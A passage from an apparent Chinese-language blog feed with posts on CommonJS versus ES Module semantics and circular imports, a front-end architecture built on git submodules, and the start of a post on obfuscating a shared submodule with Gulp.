        <content type="html"><![CDATA[<h1 id="1-ES-Module-与-CommonJS-的概念"><a href="#1-ES-Module-与-CommonJS-的概念" class="headerlink" title="1. ES Module 与 CommonJS 的概念"></a>1. ES Module 与 CommonJS 的概念</h1><p>模块化编程是个老生常谈的问题了，Javascript 有着沉重的模块化历史包袱，之前引入 Javascript 代码只能通过 Script 标签引入，这样就容易产生如下的问题：</p><ul><li>js文件作用域都是顶层，这会造成变量污染</li><li>js文件多，变得不好维护</li><li>js文件依赖问题，稍微不注意顺序引入错，代码全报错</li></ul><p>于是为了解决上述的问题，Javascript 的社区上首先出现了名为 CommonJS 的规范，NodeJS 在 v13.2.0 之前就是基于 CommonJS 规范实现模块化的。但是 CommonJS 只是一个规范，并不是浏览器下的一个功能，因此如果要将 CommonJS 规范应用与前端开发，那还必须要有构建工具的参与,常用的如 <a href="https://browserify.org/">browserify</a>，通过对入口代码的打包编译，生成一个 <code>bundle.js</code> 文件引入到 HTML 页面中。</p><p>随着 Javascript 语言的逐渐发展，模块化是其必然的一个趋势，因此在 ES6 里，Javascript 引入了可以使用 <code>import</code> <code>export</code> 简洁语句来实现模块化的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules">ES Module</a> 概念，我们可以创建一个 <code>&lt;script type=&quot;module&quot; src=&quot;xxx.js&quot;&gt;&lt;/script&gt;</code> 标签来引入一个使用了 ES Module 规则的 js 文件，从浏览器端实现了模块化编程的问题。</p><blockquote><p>但是在实际的开发过程中，如果我们使用了框架就会发现 CommonJS 与 ES Module 可以混合使用，这其实是打包工具在帮助我们做转化，具体的转化原理可以参考这篇文章：<a href="https://www.huaweicloud.com/articles/e71a6bf0e3f114f1ccac4dfcaf57fe76.html">import、require、export、module.exports 混合使用详解</a></p></blockquote><p>ES Module 与 CommonJS 都是模块化的解决方案，但是两种方式还是有很大差别的，接下来我们就会来对其差别进行一个更为详细的讨论。</p><h1 id="2-使用方式的区别"><a href="#2-使用方式的区别" class="headerlink" title="2. 使用方式的区别"></a>2. 使用方式的区别</h1><h2 id="2-1-CommonJS"><a href="#2-1-CommonJS" class="headerlink" title="2.1 CommonJS"></a>2.1 CommonJS</h2><p>基础使用：</p><p>创建模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module_a.js</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> addX = <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> value + x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">x</span> = x;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">addX</span> = addX;</span><br></pre></td></tr></table></figure><p>使用模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> module_a = <span class="built_in">require</span>(<span class="string">&quot;./module_a.js&quot;</span>)</span><br><span class="line">module_a.<span class="title function_">addX</span>(<span class="number">233</span>)</span><br></pre></td></tr></table></figure><p>在 CommonJS 规范中，我们来通过对 <code>exports</code> 对象上追加多个属性，当其他 js 文件引入该模块时，实际上就是获取了模块的 <code>exports</code> 对象，并调用对象上的各个方法。</p><p>同时我们还会发现有时 CommonJS 的模块导出会写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">x</span> = x</span><br></pre></td></tr></table></figure><p>这其实与使用 <code>exports</code> 方式导出对象并无差异，只不过是我们可以在模块内部使用 <code>module</code> 来获取到整个 <code>module</code> 对象，而 <code>module</code> 对象上又挂载着 <code>exports</code> 对象。<code>exports</code> 对象就表示模块对外输出的值，其他文件加载该模块，实际上就是读取 <code>module.exports</code> 变量。</p><p>使用 <code>module.exports</code> 也可以优化我们模块导出的写法，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module_a.js</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> addX = <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> value + x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  x,</span><br><span class="line">  addX</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时 <code>module</code> 对象上还有其他属性：</p><ul><li><code>module.id</code> 模块的识别符，通常是带有绝对路径的模块文件名。</li><li><code>module.filename</code> 模块的文件名，带有绝对路径。</li><li><code>module.loaded</code> 返回一个布尔值，表示模块是否已经完成加载。</li><li><code>module.parent</code> 返回一个对象，表示调用该模块的模块。</li><li><code>module.children</code> 返回一个数组，表示该模块要用到的其他模块。</li><li><code>module.exports</code> 表示模块对外输出的值。</li></ul><h2 id="2-2-ES-Module"><a href="#2-2-ES-Module" class="headerlink" title="2.2 ES Module"></a>2.2 ES Module</h2><p>暂略</p><h1 id="3-对于值的引用"><a href="#3-对于值的引用" class="headerlink" title="3. 对于值的引用"></a>3. 对于值的引用</h1><h2 id="3-1-CommonJS"><a href="#3-1-CommonJS" class="headerlink" title="3.1 CommonJS"></a>3.1 CommonJS</h2><p>对于 CJS，看了很多文章，对其形容比较晦涩，我们举例来说明，可总结为以下几点：</p><p><strong>1. 如果导出的值是基本类型，会对该值进行复制，不与外部共享该值</strong></p><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mod.js</span></span><br><span class="line"><span class="keyword">let</span> data = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">modifyData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  data = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  data, <span class="comment">// 这里导出的仅仅是对变量 data 的拷贝</span></span><br><span class="line">  modifyData,</span><br><span class="line">  printData</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> mod = <span class="built_in">require</span>(<span class="string">&quot;./mod.js&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mod.<span class="property">data</span>); <span class="comment">// 1</span></span><br><span class="line">mod.<span class="title function_">modifyData</span>() <span class="comment">// (1) 执行该语句后，mod.js 中的变量 data 会被修改</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mod.<span class="property">data</span>); <span class="comment">// 由于导出模块时，data 是一个基本类型值，module.exports 对象对变量 data 进行了一个浅拷贝，所以输出值仍然是 1</span></span><br><span class="line">mod.<span class="title function_">printData</span>(); <span class="comment">// 打印出 mod.js 内部的变量 data，由于前面被语句 (1) 修改了，所以输出 100</span></span><br></pre></td></tr></table></figure><p><strong>2. 如果导出的值是引用类型，会对该值进行浅拷贝，与外部共享该值</strong></p><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mod.js</span></span><br><span class="line"><span class="keyword">let</span> data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">modifyData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  data[<span class="number">0</span>] = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  data, <span class="comment">// 由于 data 是引用类型，所以这里导出的是对 data 的引用</span></span><br><span class="line">  modifyData,</span><br><span class="line">  printData</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> mod = <span class="built_in">require</span>(<span class="string">&quot;./mod.js&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mod.<span class="property">data</span>); <span class="comment">// [1, 2, 3]</span></span><br><span class="line">mod.<span class="title function_">modifyData</span>() <span class="comment">// 执行该语句后，mod.js 中的变量 data 的值会被修改</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mod.<span class="property">data</span>); <span class="comment">// 由于导出的值是对变量 data 的引用，因此输出修改后的 data：[null, 2, 3]</span></span><br><span class="line">mod.<span class="title function_">printData</span>(); <span class="comment">// [null, 2, 3]</span></span><br></pre></td></tr></table></figure><p><strong>3. 工作空间可以修改引入的值</strong></p><p>CJS 并未对内部的变量进行保护，因此在使用模块时，可以修改模块导出的值。但是要注意，由于 CJS 导出的值会被缓存，当修改了导出的值后，会影响到其他模块对该值的引用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mod.js</span></span><br><span class="line"><span class="keyword">let</span> data = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// utils.js</span></span><br><span class="line"><span class="keyword">const</span> mod = <span class="built_in">require</span>(<span class="string">&quot;./mod.js&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">printData</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(mod.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">const</span> mod = <span class="built_in">require</span>(<span class="string">&quot;./mod.js&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> utils = <span class="built_in">require</span>(<span class="string">&quot;./mod.js&quot;</span>)</span><br><span class="line">utils.<span class="title function_">printData</span>() <span class="comment">// 1</span></span><br><span class="line">mod.<span class="property">data</span> = <span class="number">100</span></span><br><span class="line">utils.<span class="title function_">printData</span>() <span class="comment">// 100</span></span><br></pre></td></tr></table></figure><blockquote><p>本质上，使用 <code>module.exports</code> 导出的就是一个对象，那么对于这个对象上所有的引用与修改都遵循 JavaScript 对于一个对象的处理方式。</p></blockquote><h2 id="3-2-ES-Module"><a href="#3-2-ES-Module" class="headerlink" title="3.2 ES Module"></a>3.2 ES Module</h2><p>相对于 CJS 导出的是一个 <code>exports</code> 对象，ESM 我们可以理解为导出的是模块内声明的各种变量。其最大的一个特点就是，导出的值是只读的，不能从外部修改，但是可以调用内部方法对其进行修改，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> data = <span class="number">1</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">addData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  data += <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; data, addData &#125; <span class="keyword">from</span> <span class="string">&quot;./module.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// 1</span></span><br><span class="line"><span class="title function_">addData</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// 2</span></span><br><span class="line">data = <span class="number">100</span> <span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure><p>这时候有的小聪明就要问了，你这里用的是解构赋值，赋值给了一个 constance 变量，如果我使用 <code>import * as xxx</code> 来直接获取导出对象，修改导出对象上的值能修改成功吗？不妨来试一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> testModule <span class="keyword">from</span> <span class="string">&quot;./module.js&quot;</span>;</span><br><span class="line">testModule.<span class="property">data</span> = <span class="number">100</span> <span class="comment">// TypeError: Cannot assign to read only property &#x27;data&#x27; of object &#x27;[object Module]&#x27;</span></span><br></pre></td></tr></table></figure><p>我们可以看出，导出的模块在本质上就是一个不可修改的值。</p><h1 id="4-模块导入的执行顺序与循环引用"><a href="#4-模块导入的执行顺序与循环引用" class="headerlink" title="4. 模块导入的执行顺序与循环引用"></a>4. 模块导入的执行顺序与循环引用</h1><h2 id="4-1-CommonJS"><a href="#4-1-CommonJS" class="headerlink" title="4.1 CommonJS"></a>4.1 CommonJS</h2><p>CJS 在模块引用时有一个重要的特性就是 <strong>加载时执行</strong>，的执行规则是沿着入口文件开始，逐次向下执行，遇到 <code>require</code> 语句后执行 require 的模块的内部代码；</p><p>如果在模块内部又再次遇到 <code>require</code> 语句，会将当前的代码缓存住，同时检查该模块是否有被引用过（也就是是否存在缓存），这就需要分为两种情况：</p><ol><li>如果 require 的模块之前未被引用过，则暂停当前模块的解析，进入新的模块，并执行新模块内部的代码</li><li>如果 require 的模块之前被引用过，则无视该 require 语句，继续向下执行</li></ol><p>这种引用方式，可以让 CJS 避免循环引用造成代的码锁死，但是也会造成引用顺序不当从而导致某些模块的变量未被创建就本引用的问题。</p><p>以下的这个示例就能很好的展示 CJS 的模块引用顺序：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./modA.js&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">require</span>(<span class="string">&#x27;./modB.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;index.js-1&#x27;</span>, <span class="string">&#x27;执行完毕&#x27;</span>, a.<span class="property">done</span>, b.<span class="property">done</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// modA.js</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">done</span> = <span class="literal">false</span></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">require</span>(<span class="string">&#x27;./modB.js&#x27;</span>)</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">data</span> = <span class="number">100</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;modA.js-1&#x27;</span>, b.<span class="property">done</span>)</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">done</span> = <span class="literal">true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;modB.js-2&#x27;</span>, <span class="string">&#x27;执行完毕&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// modB.js</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">done</span> = <span class="literal">false</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./modA.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;modB.js-1&#x27;</span>, a.<span class="property">done</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;modB.js-1&quot;</span>, a.<span class="property">data</span>);</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">done</span> = <span class="literal">true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;modB.js-2&#x27;</span>, <span class="string">&#x27;执行完毕&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">modB.js-1 false</span></span><br><span class="line"><span class="comment">modB.js-1 undefined</span></span><br><span class="line"><span class="comment">modB.js-2 执行完毕</span></span><br><span class="line"><span class="comment">modA.js-1 true</span></span><br><span class="line"><span class="comment">modB.js-2 执行完毕</span></span><br><span class="line"><span class="comment">index.js-1 执行完毕 true true</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>执行图解如下：</p><p><img src="https://i.loli.net/2021/07/21/QX9zCH3Zq72xcuy.png" alt=""></p><h2 id="4-2-ES-Module"><a href="#4-2-ES-Module" class="headerlink" title="4.2 ES Module"></a>4.2 ES Module</h2><p>ES6模块的运行机制与 CommonJS 不太一样，它遇到模块加载命令 <code>import</code> 时，生成的是一个引用，等到真正是用的时候才会去取值.</p><p>ES6模块不会缓存运行结果，而是动态地去被加载的模块取值，以及变量总是绑定其所在的模块。这导致 ES6 处理”循环加载”与 CommonJS 有本质的不同。ES6根本不会关心是否发生了”循环加载”，只是生成一个指向被加载模块的引用，需要开发者自己保证，真正取值的时候能够取到值。</p><p>举例来说：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; bar &#125; <span class="keyword">from</span> <span class="string">&quot;./b.js&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">bar</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;执行完毕&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">&quot;./a.js&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 设置一定概率跳出循环，避免堆栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line">    <span class="title function_">foo</span>(); <span class="comment">// 代码执行到 foo 时才去访问导入的 foo 函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码可以正常执行，会输出随机概率个 <code>执行完毕</code>。</p><p>然而如果换成 CJS 的写法，代码是无法运行的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a_cjs.js</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="built_in">require</span>(<span class="string">&quot;./b_cjs.js&quot;</span>).<span class="property">bar</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">bar</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;执行完毕&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  foo,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b_cjs.js</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="built_in">require</span>(<span class="string">&quot;./a_cjs.js&quot;</span>).<span class="property">foo</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(foo); <span class="comment">// 代码按顺序加载到该行时，a_cjs.js 此时尚未导出 foo 函数，所以此处的取值是 undefined，会导致下方代码无法运行（如果跳入随机）</span></span><br><span class="line">  <span class="comment">// 设置一定概率跳出循环，避免堆栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line">    <span class="title function_">foo</span>(); <span class="comment">// TypeError: foo is not a function</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  bar,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数制前端整体架构概览</title>
      <link href="/2021/07/90c7e58a4634.html"/>
      <url>/2021/07/90c7e58a4634.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-子项目以及子模块"><a href="#1-子项目以及子模块" class="headerlink" title="1. 子项目以及子模块"></a>1. 子项目以及子模块</h1><p>公司的整体项目是有多个模块构成的，比如物流管理、销售管理、人力资源管理 …… 如果将公司的所有模块作为一个整体项目来开发，那么维护代码库随着后面的模块开发将会变得越来越庞大，整个项目的上线也将变得逐渐难以控制。</p><p>因此我们为每个模块开了不同的 git 仓库来管理，以一个基座项目为基础，关联到所有的子项目。</p><p>但是每个子项目之前会有共用的代码，比如通用的组件、hooks、types 等，那么如何共享这些代码呢？我们引入了 <a href="https://git-scm.com/book/en/v2/Git-Tools-Submodules">git submodules</a> 来连接多个模块库，这样只要公共部分的代码变更后，其他模块只需要调用 <code>git submodule foreach git pull origin [branchName]</code> 来拉取各个子模块的最新代码即可，这一行为可以使用 ci 在服务器端每天定时运行，保证公共代码统一是最新的。</p><p>所以整体的项目架构关系图如下：</p><p><img src="https://i.loli.net/2021/07/07/EDkleYvNFgUHRIA.png" alt=""></p><h1 id="2-项目构建流程"><a href="#2-项目构建流程" class="headerlink" title="2. 项目构建流程"></a>2. 项目构建流程</h1><p>在上述的项目架构上，我们是用 jenkins 来启动一个部署脚本来进行全量或者分量部署的。</p><p>对于前端而言，不同的租户我们会根据其域名来部署不通的前端页面，同时有些页面还需要不同的定制，如改变不同的主题色、不同的logo 等，这些定制需求也会在我们的项目打包过程中利用自动化脚本完成。但是所有的租户都是由同一个后台来管理的，同时我们拥有运营平台服务来管理每个租户的页面权限，在项目的打包过程中会参考运营平台该租户的权限配置来生成不同的页面。</p><p>整体流程如下：</p><p><img src="https://i.loli.net/2021/07/07/inGVsmr4Y6OjS1H.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 项目实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Submodules 分库加密的工程化解决方案</title>
      <link href="/2021/07/59f215f07041.html"/>
      <url>/2021/07/59f215f07041.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>由于公司的项目分为多个模块，为了方便多个模块分开开发，防止代码混淆，因此每个项目模块都另外开了一个分库来维护，然后有一个整体的项目基座用来关联各个模块的页面跳转，项目上线时也可以单个模块增量上线。</p><p>但是这么一套架构就带来另外一个问题，对于每个模块的共用部分，如 utils、hooks、components、mockData 等每次更新时都要复制一份到各个模块中，保证每个模块的公共代码部分都保持一致，这个工作量无疑是庞大的。</p><p>因此我们引入了 <a href="https://git-scm.com/book/en/v2/Git-Tools-Submodules">git submodules</a> 来连接多个模块库，这样只要公共部分的代码变更后，其他模块只需要调用 <code>git submodule foreach git pull origin [branchName]</code> 来拉取各个子模块的最新代码即可，这一行为可以使用 ci 在服务器端每天定时运行，保证公共代码统一是最新的。</p><p>但是我们的公共模块不只服务于我们自己的项目，目前公司有需求聘用外部团队，那么公共代码的源码直接交给外部团队就很不安全了。因此我们现在有一个新的需求，就是对子模块进行加密，同时保证加密模块要与公司内部的代码保持同步更新，对外只提供加密后的模块。</p><h1 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2. 解决方案"></a>2. 解决方案</h1><p>其实，整体的解决方案并不繁琐，我们可以简单整理为如下几步：</p><ol><li>拉取子库最新的代码</li><li>将最新的代码进行编译、压缩、混淆</li><li>将处理过的代码 push 到单独的新代码库中，如 <code>component_encrypt</code></li></ol><p>明确了我们的思路后，接下来就是工程化和自动化的实现，按照以往的经验，仅仅对代码进行编译与压缩，使用 Gulp 最合适不过了，同时 Gulp 也支持 git 操作与普通的命令行操作，我们第一步与最后一步的操作都需要用到 git，也可以借助 Gulp 来实现自动化。</p><h1 id="3-实践"><a href="#3-实践" class="headerlink" title="3. 实践"></a>3. 实践</h1><p>明确了以上的三个步骤，我们就开始编写 Gulp 脚本，并在一个子库中进行实验。</p><p>我们挑选的子库是我们的 <code>components</code> 组件库，其有一个 dev 分支，我们平常迭代代码都是在 dev 分支更新代码，为了不干扰 dev 分支的正常开发，我们单独开一个分支名为 <code>encrypt</code>，如果需要进行代码加密的工作，就切到 <code>encrypt</code> 分支来进行。</p><h2 id="3-1-拉取最新代码"><a href="#3-1-拉取最新代码" class="headerlink" title="3.1 拉取最新代码"></a>3.1 拉取最新代码</h2><p>我们切到负责加密的分支 <code>encrypt</code> 后，如果想要更新最新的代码就需要调用 <code>git pull origin dev</code> 来完成，这一步可以借助 <a 